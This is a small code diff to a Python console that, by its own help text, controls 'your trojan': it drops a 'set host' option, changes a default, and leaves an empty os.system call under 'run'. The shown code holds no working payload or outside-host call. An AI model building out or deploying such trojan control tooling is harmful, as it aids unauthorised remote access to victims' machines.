@@ -2,7 +2,7 @@ import main as main
 
 
 class attack:
-    connect: str = ""
+    connect: str = "Default"
     port: int = 8888
 
 
@@ -38,18 +38,12 @@ def web_control_console(payload: str):
                 continue
             if command == "help":
                 print("""
-    1. set host [Host IP]           Set your trojan's connect host.
-    2. set port [Port]              Set your trojan's connect port.
-    3. run                          listen on a port and accept the message.
+    1. set port [Port]              Set your trojan's connect port.
+    2. run                          listen on a port and accept the message.
     
     For example:
-    1. set host 127.0.0.1
-    2. set port 8888
+    1. set port 8888
                 """)
-            if command.startswith("set host "):
-                host: str = command[len("set host "):len(command)]
-                attack.connect = host
-                continue
 
             if command.startswith("set port "):
                 port: int = int(command[len("set port "):len(command)])
@@ -59,7 +53,7 @@ def web_control_console(payload: str):
                 break
 
             if command == 'run':
-
+                os.system("")
 
         except:
             continue
